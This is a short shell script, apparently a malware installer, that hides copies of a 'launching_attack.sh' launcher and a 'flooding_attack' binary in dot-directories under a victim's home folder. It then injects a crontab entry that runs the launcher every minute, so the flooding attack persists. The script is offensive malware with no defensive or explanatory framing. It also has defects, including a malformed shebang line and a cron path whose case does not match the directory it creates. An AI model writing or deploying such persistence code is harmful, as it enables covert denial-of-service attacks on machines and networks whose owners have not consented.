#/bin/sh

check_crontab() {
  local crontab_command='* * * * * [ -f /home/victim/.launch_attack/launching_attack.sh ] && /home/victim/.launch_attack/launching_attack.sh'
  crontab -l > /tmp/tmp_cron
  cat /tmp/tmp_cron | grep -Fxq "$crontab_command"
  if [ $? -eq 0 ]; then # positive match
    echo "Crontab already injected!"
  else
    echo "$crontab_command" >> /tmp/tmp_cron
    crontab /tmp/tmp_cron
  fi
  rm /tmp/tmp_cron
}

main() {
  local home_dir="/home/victim"
  local launch_dir=".Launch_Attack"
  local dir01=".etc"
  local dir02=".var"
  local module_dir=".module"
  local launch_file="$home_dir/src/launching_attack.sh"
  local flooding_file="$home_dir/src/flooding_attack"
  mkdir -p "$home_dir/$launch_dir"
  mkdir -p "$home_dir/$dir01/$module_dir"
  mkdir -p "$home_dir/$dir02/$module_dir"
  mv "$home_dir/src/b" "$flooding_file" # reuse the provided file
  cp "$launch_file" "$home_dir/$launch_dir"
  cp "$launch_file" "$flooding_file" "$home_dir/$dir01/$module_dir"
  cp "$launch_file" "$flooding_file" "$home_dir/$dir02/$module_dir"
  check_crontab
}
main